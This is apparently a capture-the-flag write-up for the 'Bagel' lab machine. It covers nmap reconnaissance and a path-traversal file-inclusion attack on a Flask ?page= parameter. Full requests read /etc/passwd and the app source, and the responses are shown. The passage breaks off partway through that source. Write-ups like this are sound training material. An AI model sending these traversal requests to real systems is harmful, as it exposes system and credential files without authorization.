# Bagel

## Reconnaissance

### Nmap

```c
$ sudo nmap -A -T4 -sC -sV 10.129.158.216
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-19 10:51 GMT
Nmap scan report for 10.129.158.216
Host is up (0.049s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.8 (protocol 2.0)
| ssh-hostkey: 
|   256 6e4e1341f2fed9e0f7275bededcc68c2 (ECDSA)
|_  256 80a7cd10e72fdb958b869b1b20652a98 (ED25519)
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 400 Bad Request
|     Server: Microsoft-NetCore/2.0
|     Date: Sun, 19 Feb 2023 10:51:15 GMT
|     Connection: close
|   HTTPOptions: 
|     HTTP/1.1 400 Bad Request
|     Server: Microsoft-NetCore/2.0
|     Date: Sun, 19 Feb 2023 10:51:30 GMT
|     Connection: close
|   Help, SSLSessionReq: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/html
|     Server: Microsoft-NetCore/2.0
|     Date: Sun, 19 Feb 2023 10:51:40 GMT
|     Content-Length: 52
|     Connection: close
|     Keep-Alive: true
|     <h1>Bad Request (Invalid request line (parts).)</h1>
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/html
|     Server: Microsoft-NetCore/2.0
|     Date: Sun, 19 Feb 2023 10:51:15 GMT
|     Content-Length: 54
|     Connection: close
|     Keep-Alive: true
|     <h1>Bad Request (Invalid request line (version).)</h1>
|   TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/html
|     Server: Microsoft-NetCore/2.0
|     Date: Sun, 19 Feb 2023 10:51:41 GMT
|     Content-Length: 52
|     Connection: close
|     Keep-Alive: true
|_    <h1>Bad Request (Invalid request line (parts).)</h1>
8000/tcp open  http-alt Werkzeug/2.2.2 Python/3.10.9
|_http-server-header: Werkzeug/2.2.2 Python/3.10.9
|_http-title: Did not follow redirect to http://bagel.htb:8000/?page=index.html
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 NOT FOUND
|     Server: Werkzeug/2.2.2 Python/3.10.9
|     Date: Sun, 19 Feb 2023 10:51:15 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 207
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.1 302 FOUND
|     Server: Werkzeug/2.2.2 Python/3.10.9
|     Date: Sun, 19 Feb 2023 10:51:10 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 263
|     Location: http://bagel.htb:8000/?page=index.html
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>Redirecting...</title>
|     <h1>Redirecting...</h1>
|     <p>You should be redirected automatically to the target URL: <a href="http://bagel.htb:8000/?page=index.html">http://bagel.htb:8000/?page=index.html</a>. If not, click the link.
|   Socks5: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request syntax ('
|     ').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5000-TCP:V=7.93%I=7%D=2/19%Time=63F1FF24%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,73,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nServer:\x20Microsoft
SF:-NetCore/2\.0\r\nDate:\x20Sun,\x2019\x20Feb\x202023\x2010:51:15\x20GMT\
SF:r\nConnection:\x20close\r\n\r\n")%r(RTSPRequest,E8,"HTTP/1\.1\x20400\x2
SF:0Bad\x20Request\r\nContent-Type:\x20text/html\r\nServer:\x20Microsoft-N
SF:etCore/2\.0\r\nDate:\x20Sun,\x2019\x20Feb\x202023\x2010:51:15\x20GMT\r\
SF:nContent-Length:\x2054\r\nConnection:\x20close\r\nKeep-Alive:\x20true\r
SF:\n\r\n<h1>Bad\x20Request\x20\(Invalid\x20request\x20line\x20\(version\)
SF:\.\)</h1>")%r(HTTPOptions,73,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nSer
SF:ver:\x20Microsoft-NetCore/2\.0\r\nDate:\x20Sun,\x2019\x20Feb\x202023\x2
SF:010:51:30\x20GMT\r\nConnection:\x20close\r\n\r\n")%r(Help,E6,"HTTP/1\.1
SF:\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/html\r\nServer:\x20M
SF:icrosoft-NetCore/2\.0\r\nDate:\x20Sun,\x2019\x20Feb\x202023\x2010:51:40
SF:\x20GMT\r\nContent-Length:\x2052\r\nConnection:\x20close\r\nKeep-Alive:
SF:\x20true\r\n\r\n<h1>Bad\x20Request\x20\(Invalid\x20request\x20line\x20\
SF:(parts\)\.\)</h1>")%r(SSLSessionReq,E6,"HTTP/1\.1\x20400\x20Bad\x20Requ
SF:est\r\nContent-Type:\x20text/html\r\nServer:\x20Microsoft-NetCore/2\.0\
SF:r\nDate:\x20Sun,\x2019\x20Feb\x202023\x2010:51:40\x20GMT\r\nContent-Len
SF:gth:\x2052\r\nConnection:\x20close\r\nKeep-Alive:\x20true\r\n\r\n<h1>Ba
SF:d\x20Request\x20\(Invalid\x20request\x20line\x20\(parts\)\.\)</h1>")%r(
SF:TerminalServerCookie,E6,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-
SF:Type:\x20text/html\r\nServer:\x20Microsoft-NetCore/2\.0\r\nDate:\x20Sun
SF:,\x2019\x20Feb\x202023\x2010:51:41\x20GMT\r\nContent-Length:\x2052\r\nC
SF:onnection:\x20close\r\nKeep-Alive:\x20true\r\n\r\n<h1>Bad\x20Request\x2
SF:0\(Invalid\x20request\x20line\x20\(parts\)\.\)</h1>")%r(TLSSessionReq,E
SF:6,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/html\r\n
SF:Server:\x20Microsoft-NetCore/2\.0\r\nDate:\x20Sun,\x2019\x20Feb\x202023
SF:\x2010:51:41\x20GMT\r\nContent-Length:\x2052\r\nConnection:\x20close\r\
SF:nKeep-Alive:\x20true\r\n\r\n<h1>Bad\x20Request\x20\(Invalid\x20request\
SF:x20line\x20\(parts\)\.\)</h1>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8000-TCP:V=7.93%I=7%D=2/19%Time=63F1FF1F%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,1EA,"HTTP/1\.1\x20302\x20FOUND\r\nServer:\x20Werkzeug/2\.2\.2\
SF:x20Python/3\.10\.9\r\nDate:\x20Sun,\x2019\x20Feb\x202023\x2010:51:10\x2
SF:0GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:
SF:\x20263\r\nLocation:\x20http://bagel\.htb:8000/\?page=index\.html\r\nCo
SF:nnection:\x20close\r\n\r\n<!doctype\x20html>\n<html\x20lang=en>\n<title
SF:>Redirecting\.\.\.</title>\n<h1>Redirecting\.\.\.</h1>\n<p>You\x20shoul
SF:d\x20be\x20redirected\x20automatically\x20to\x20the\x20target\x20URL:\x
SF:20<a\x20href=\"http://bagel\.htb:8000/\?page=index\.html\">http://bagel
SF:\.htb:8000/\?page=index\.html</a>\.\x20If\x20not,\x20click\x20the\x20li
SF:nk\.\n")%r(FourOhFourRequest,184,"HTTP/1\.1\x20404\x20NOT\x20FOUND\r\nS
SF:erver:\x20Werkzeug/2\.2\.2\x20Python/3\.10\.9\r\nDate:\x20Sun,\x2019\x2
SF:0Feb\x202023\x2010:51:15\x20GMT\r\nContent-Type:\x20text/html;\x20chars
SF:et=utf-8\r\nContent-Length:\x20207\r\nConnection:\x20close\r\n\r\n<!doc
SF:type\x20html>\n<html\x20lang=en>\n<title>404\x20Not\x20Found</title>\n<
SF:h1>Not\x20Found</h1>\n<p>The\x20requested\x20URL\x20was\x20not\x20found
SF:\x20on\x20the\x20server\.\x20If\x20you\x20entered\x20the\x20URL\x20manu
SF:ally\x20please\x20check\x20your\x20spelling\x20and\x20try\x20again\.</p
SF:>\n")%r(Socks5,213,"<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//DTD\x20HTM
SF:L\x204\.01//EN\"\n\x20\x20\x20\x20\x20\x20\x20\x20\"http://www\.w3\.org
SF:/TR/html4/strict\.dtd\">\n<html>\n\x20\x20\x20\x20<head>\n\x20\x20\x20\
SF:x20\x20\x20\x20\x20<meta\x20http-equiv=\"Content-Type\"\x20content=\"te
SF:xt/html;charset=utf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x20<title>Error\
SF:x20response</title>\n\x20\x20\x20\x20</head>\n\x20\x20\x20\x20<body>\n\
SF:x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20response</h1>\n\x20\x20\x20
SF:\x20\x20\x20\x20\x20<p>Error\x20code:\x20400</p>\n\x20\x20\x20\x20\x20\
SF:x20\x20\x20<p>Message:\x20Bad\x20request\x20syntax\x20\('\\x05\\x04\\x0
SF:0\\x01\\x02\\x80\\x05\\x01\\x00\\x03'\)\.</p>\n\x20\x20\x20\x20\x20\x20
SF:\x20\x20<p>Error\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\x20
SF:-\x20Bad\x20request\x20syntax\x20or\x20unsupported\x20method\.</p>\n\x2
SF:0\x20\x20\x20</body>\n</html>\n");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=2/19%OT=22%CT=1%CU=31134%PV=Y%DS=2%DC=T%G=Y%TM=63F1FF8
OS:A%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)SEQ
OS:(SP=105%GCD=1%ISR=10A%TI=Z%CI=Z%TS=A)OPS(O1=M552ST11NW7%O2=M552ST11NW7%O
OS:3=M552NNT11NW7%O4=M552ST11NW7%O5=M552ST11NW7%O6=M552ST11)WIN(W1=FE88%W2=
OS:FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M552NNSN
OS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D
OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O
OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops

TRACEROUTE (using port 8888/tcp)
HOP RTT      ADDRESS
1   48.79 ms 10.10.14.1
2   49.01 ms 10.129.158.216

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 114.86 seconds
```

```c
$ sudo nmap -A -T4 -sC -sV -p- 10.129.158.216
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-19 10:53 GMT
Nmap scan report for 10.129.158.216
Host is up (0.049s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.8 (protocol 2.0)
| ssh-hostkey: 
|   256 6e4e1341f2fed9e0f7275bededcc68c2 (ECDSA)
|_  256 80a7cd10e72fdb958b869b1b20652a98 (ED25519)
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 400 Bad Request
|     Server: Microsoft-NetCore/2.0
|     Date: Sun, 19 Feb 2023 10:53:49 GMT
|     Connection: close
|   HTTPOptions: 
|     HTTP/1.1 400 Bad Request
|     Server: Microsoft-NetCore/2.0
|     Date: Sun, 19 Feb 2023 10:54:04 GMT
|     Connection: close
|   Help, SSLSessionReq: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/html
|     Server: Microsoft-NetCore/2.0
|     Date: Sun, 19 Feb 2023 10:54:14 GMT
|     Content-Length: 52
|     Connection: close
|     Keep-Alive: true
|     <h1>Bad Request (Invalid request line (parts).)</h1>
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/html
|     Server: Microsoft-NetCore/2.0
|     Date: Sun, 19 Feb 2023 10:53:49 GMT
|     Content-Length: 54
|     Connection: close
|     Keep-Alive: true
|     <h1>Bad Request (Invalid request line (version).)</h1>
|   TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/html
|     Server: Microsoft-NetCore/2.0
|     Date: Sun, 19 Feb 2023 10:54:15 GMT
|     Content-Length: 52
|     Connection: close
|     Keep-Alive: true
|_    <h1>Bad Request (Invalid request line (parts).)</h1>
8000/tcp open  http-alt Werkzeug/2.2.2 Python/3.10.9
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 NOT FOUND
|     Server: Werkzeug/2.2.2 Python/3.10.9
|     Date: Sun, 19 Feb 2023 10:53:49 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 207
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.1 302 FOUND
|     Server: Werkzeug/2.2.2 Python/3.10.9
|     Date: Sun, 19 Feb 2023 10:53:44 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 263
|     Location: http://bagel.htb:8000/?page=index.html
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>Redirecting...</title>
|     <h1>Redirecting...</h1>
|     <p>You should be redirected automatically to the target URL: <a href="http://bagel.htb:8000/?page=index.html">http://bagel.htb:8000/?page=index.html</a>. If not, click the link.
|   Socks5: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request syntax ('
|     ').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
|_http-title: Did not follow redirect to http://bagel.htb:8000/?page=index.html
|_http-server-header: Werkzeug/2.2.2 Python/3.10.9
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5000-TCP:V=7.93%I=7%D=2/19%Time=63F1FFBF%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,73,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nServer:\x20Microsoft
SF:-NetCore/2\.0\r\nDate:\x20Sun,\x2019\x20Feb\x202023\x2010:53:49\x20GMT\
SF:r\nConnection:\x20close\r\n\r\n")%r(RTSPRequest,E8,"HTTP/1\.1\x20400\x2
SF:0Bad\x20Request\r\nContent-Type:\x20text/html\r\nServer:\x20Microsoft-N
SF:etCore/2\.0\r\nDate:\x20Sun,\x2019\x20Feb\x202023\x2010:53:49\x20GMT\r\
SF:nContent-Length:\x2054\r\nConnection:\x20close\r\nKeep-Alive:\x20true\r
SF:\n\r\n<h1>Bad\x20Request\x20\(Invalid\x20request\x20line\x20\(version\)
SF:\.\)</h1>")%r(HTTPOptions,73,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nSer
SF:ver:\x20Microsoft-NetCore/2\.0\r\nDate:\x20Sun,\x2019\x20Feb\x202023\x2
SF:010:54:04\x20GMT\r\nConnection:\x20close\r\n\r\n")%r(Help,E6,"HTTP/1\.1
SF:\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/html\r\nServer:\x20M
SF:icrosoft-NetCore/2\.0\r\nDate:\x20Sun,\x2019\x20Feb\x202023\x2010:54:14
SF:\x20GMT\r\nContent-Length:\x2052\r\nConnection:\x20close\r\nKeep-Alive:
SF:\x20true\r\n\r\n<h1>Bad\x20Request\x20\(Invalid\x20request\x20line\x20\
SF:(parts\)\.\)</h1>")%r(SSLSessionReq,E6,"HTTP/1\.1\x20400\x20Bad\x20Requ
SF:est\r\nContent-Type:\x20text/html\r\nServer:\x20Microsoft-NetCore/2\.0\
SF:r\nDate:\x20Sun,\x2019\x20Feb\x202023\x2010:54:14\x20GMT\r\nContent-Len
SF:gth:\x2052\r\nConnection:\x20close\r\nKeep-Alive:\x20true\r\n\r\n<h1>Ba
SF:d\x20Request\x20\(Invalid\x20request\x20line\x20\(parts\)\.\)</h1>")%r(
SF:TerminalServerCookie,E6,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-
SF:Type:\x20text/html\r\nServer:\x20Microsoft-NetCore/2\.0\r\nDate:\x20Sun
SF:,\x2019\x20Feb\x202023\x2010:54:15\x20GMT\r\nContent-Length:\x2052\r\nC
SF:onnection:\x20close\r\nKeep-Alive:\x20true\r\n\r\n<h1>Bad\x20Request\x2
SF:0\(Invalid\x20request\x20line\x20\(parts\)\.\)</h1>")%r(TLSSessionReq,E
SF:6,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/html\r\n
SF:Server:\x20Microsoft-NetCore/2\.0\r\nDate:\x20Sun,\x2019\x20Feb\x202023
SF:\x2010:54:15\x20GMT\r\nContent-Length:\x2052\r\nConnection:\x20close\r\
SF:nKeep-Alive:\x20true\r\n\r\n<h1>Bad\x20Request\x20\(Invalid\x20request\
SF:x20line\x20\(parts\)\.\)</h1>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8000-TCP:V=7.93%I=7%D=2/19%Time=63F1FFBA%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,1EA,"HTTP/1\.1\x20302\x20FOUND\r\nServer:\x20Werkzeug/2\.2\.2\
SF:x20Python/3\.10\.9\r\nDate:\x20Sun,\x2019\x20Feb\x202023\x2010:53:44\x2
SF:0GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:
SF:\x20263\r\nLocation:\x20http://bagel\.htb:8000/\?page=index\.html\r\nCo
SF:nnection:\x20close\r\n\r\n<!doctype\x20html>\n<html\x20lang=en>\n<title
SF:>Redirecting\.\.\.</title>\n<h1>Redirecting\.\.\.</h1>\n<p>You\x20shoul
SF:d\x20be\x20redirected\x20automatically\x20to\x20the\x20target\x20URL:\x
SF:20<a\x20href=\"http://bagel\.htb:8000/\?page=index\.html\">http://bagel
SF:\.htb:8000/\?page=index\.html</a>\.\x20If\x20not,\x20click\x20the\x20li
SF:nk\.\n")%r(FourOhFourRequest,184,"HTTP/1\.1\x20404\x20NOT\x20FOUND\r\nS
SF:erver:\x20Werkzeug/2\.2\.2\x20Python/3\.10\.9\r\nDate:\x20Sun,\x2019\x2
SF:0Feb\x202023\x2010:53:49\x20GMT\r\nContent-Type:\x20text/html;\x20chars
SF:et=utf-8\r\nContent-Length:\x20207\r\nConnection:\x20close\r\n\r\n<!doc
SF:type\x20html>\n<html\x20lang=en>\n<title>404\x20Not\x20Found</title>\n<
SF:h1>Not\x20Found</h1>\n<p>The\x20requested\x20URL\x20was\x20not\x20found
SF:\x20on\x20the\x20server\.\x20If\x20you\x20entered\x20the\x20URL\x20manu
SF:ally\x20please\x20check\x20your\x20spelling\x20and\x20try\x20again\.</p
SF:>\n")%r(Socks5,213,"<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//DTD\x20HTM
SF:L\x204\.01//EN\"\n\x20\x20\x20\x20\x20\x20\x20\x20\"http://www\.w3\.org
SF:/TR/html4/strict\.dtd\">\n<html>\n\x20\x20\x20\x20<head>\n\x20\x20\x20\
SF:x20\x20\x20\x20\x20<meta\x20http-equiv=\"Content-Type\"\x20content=\"te
SF:xt/html;charset=utf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x20<title>Error\
SF:x20response</title>\n\x20\x20\x20\x20</head>\n\x20\x20\x20\x20<body>\n\
SF:x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20response</h1>\n\x20\x20\x20
SF:\x20\x20\x20\x20\x20<p>Error\x20code:\x20400</p>\n\x20\x20\x20\x20\x20\
SF:x20\x20\x20<p>Message:\x20Bad\x20request\x20syntax\x20\('\\x05\\x04\\x0
SF:0\\x01\\x02\\x80\\x05\\x01\\x00\\x03'\)\.</p>\n\x20\x20\x20\x20\x20\x20
SF:\x20\x20<p>Error\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\x20
SF:-\x20Bad\x20request\x20syntax\x20or\x20unsupported\x20method\.</p>\n\x2
SF:0\x20\x20\x20</body>\n</html>\n");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=2/19%OT=22%CT=1%CU=30192%PV=Y%DS=2%DC=T%G=Y%TM=63F2002
OS:6%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10C%TI=Z%CI=Z%TS=A)SEQ(SP=1
OS:07%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M552ST11NW7%O2=M552ST11NW7%O
OS:3=M552NNT11NW7%O4=M552ST11NW7%O5=M552ST11NW7%O6=M552ST11)WIN(W1=FE88%W2=
OS:FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M552NNSN
OS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D
OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O
OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops

TRACEROUTE (using port 995/tcp)
HOP RTT      ADDRESS
1   48.58 ms 10.10.14.1
2   49.28 ms 10.129.158.216

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 135.16 seconds
```

```c
$ sudo nmap -sV -sU 10.129.158.216
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-19 10:57 GMT
Nmap scan report for bagel.htb (10.129.158.216)
Host is up (0.048s latency).
All 1000 scanned ports on bagel.htb (10.129.158.216) are in ignored states.
Not shown: 1000 closed udp ports (port-unreach)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1039.47 seconds
```

### Enumeration of Port 8000/TCP

> http://10.129.158.216:8000

```c
$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.158.216  bagel.htb
```

```c
$ whatweb http://bagel.htb:8000
http://bagel.htb:8000 [302 Found] Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/2.2.2 Python/3.10.9], IP[10.129.158.216], Python[3.10.9], RedirectLocation[http://bagel.htb:8000/?page=index.html], Title[Redirecting...], Werkzeug[2.2.2]
http://bagel.htb:8000/?page=index.html [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/2.2.2 Python/3.10.9], IP[10.129.158.216], JQuery, Meta-Author[freehtml5.co], Modernizr[2.6.2.min], Open-Graph-Protocol, Python[3.10.9], Script, Title[Bagel &mdash; Free Website Template, Free HTML5 Template by freehtml5.co], Werkzeug[2.2.2], X-UA-Compatible[IE=edge]
```

> http://bagel.htb:8000/orders

```c
order #1 address: NY. 99 Wall St., client name: P.Morgan, details: [20 chocko-bagels] order #2 address: Berlin. 339 Landsberger.A., client name: J.Smith, details: [50 bagels] order #3 address: Warsaw. 437 Radomska., client name: A.Kowalska, details: [93 bel-bagels] 
```

### Local File Inclusion (LFI)

Modified Request:

```c
GET /?page=../../../../../../etc/passwd HTTP/1.1
Host: bagel.htb:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
If-Modified-Since: Thu, 26 Jan 2023 17:40:39 GMT
If-None-Match: "1674754839.6421967-8698-149884447"


```

Response:

```c
HTTP/1.1 200 OK
Server: Werkzeug/2.2.2 Python/3.10.9
Date: Sun, 19 Feb 2023 10:59:11 GMT
Content-Disposition: inline; filename=passwd
Content-Type: application/octet-stream
Content-Length: 1823
Last-Modified: Wed, 25 Jan 2023 12:44:39 GMT
Cache-Control: no-cache
ETag: "1674650679.4629574-1823-4270330211"
Date: Sun, 19 Feb 2023 10:59:11 GMT
Connection: close

root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
tss:x:59:59:Account used for TPM access:/dev/null:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/usr/sbin/nologin
systemd-oom:x:999:999:systemd Userspace OOM Killer:/:/usr/sbin/nologin
systemd-resolve:x:193:193:systemd Resolver:/:/usr/sbin/nologin
polkitd:x:998:997:User for polkitd:/:/sbin/nologin
rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
abrt:x:173:173::/etc/abrt:/sbin/nologin
setroubleshoot:x:997:995:SELinux troubleshoot server:/var/lib/setroubleshoot:/sbin/nologin
cockpit-ws:x:996:994:User for cockpit web service:/nonexisting:/sbin/nologin
cockpit-wsinstance:x:995:993:User for cockpit-ws instances:/nonexisting:/sbin/nologin
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/usr/share/empty.sshd:/sbin/nologin
chrony:x:994:992::/var/lib/chrony:/sbin/nologin
dnsmasq:x:993:991:Dnsmasq DHCP and DNS server:/var/lib/dnsmasq:/sbin/nologin
tcpdump:x:72:72::/:/sbin/nologin
systemd-coredump:x:989:989:systemd Core Dumper:/:/usr/sbin/nologin
systemd-timesync:x:988:988:systemd Time Synchronization:/:/usr/sbin/nologin
developer:x:1000:1000::/home/developer:/bin/bash
phil:x:1001:1001::/home/phil:/bin/bash
_laurel:x:987:987::/var/log/laurel:/bin/false

```

| Username |
| --- |
| developer |
| phil |

```c
HTTP/1.1 200 OK
Server: Werkzeug/2.2.2 Python/3.10.9
Date: Sun, 19 Feb 2023 10:59:11 GMT
Content-Disposition: inline; filename=passwd
Content-Type: application/octet-stream
Content-Length: 1823
Last-Modified: Wed, 25 Jan 2023 12:44:39 GMT
Cache-Control: no-cache
ETag: "1674650679.4629574-1823-4270330211"
Date: Sun, 19 Feb 2023 10:59:11 GMT
Connection: close
```

```c
GET /?page=../../../../../../proc/self/cwd/app.py HTTP/1.1
Host: bagel.htb:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
If-Modified-Since: Thu, 26 Jan 2023 17:40:39 GMT
If-None-Match: "1674754839.6421967-8698-149884447"


```

```c
HTTP/1.1 200 OK
Server: Werkzeug/2.2.2 Python/3.10.9
Date: Sun, 19 Feb 2023 11:03:42 GMT
Content-Disposition: inline; filename=app.py
Content-Type: text/x-python; charset=utf-8
Content-Length: 1235
Last-Modified: Sun, 23 Oct 2022 14:06:13 GMT
Cache-Control: no-cache
ETag: "1666533973.0-1235-3201438951"
Date: Sun, 19 Feb 2023 11:03:42 GMT
Connection: close

from flask import Flask, request, send_file, redirect, Response
import os.path
import websocket,json

app = Flask(__name__)

@app.route('/')
def index():
        if 'page' in request.args:
            page = 'static/'+request.args.get('page')
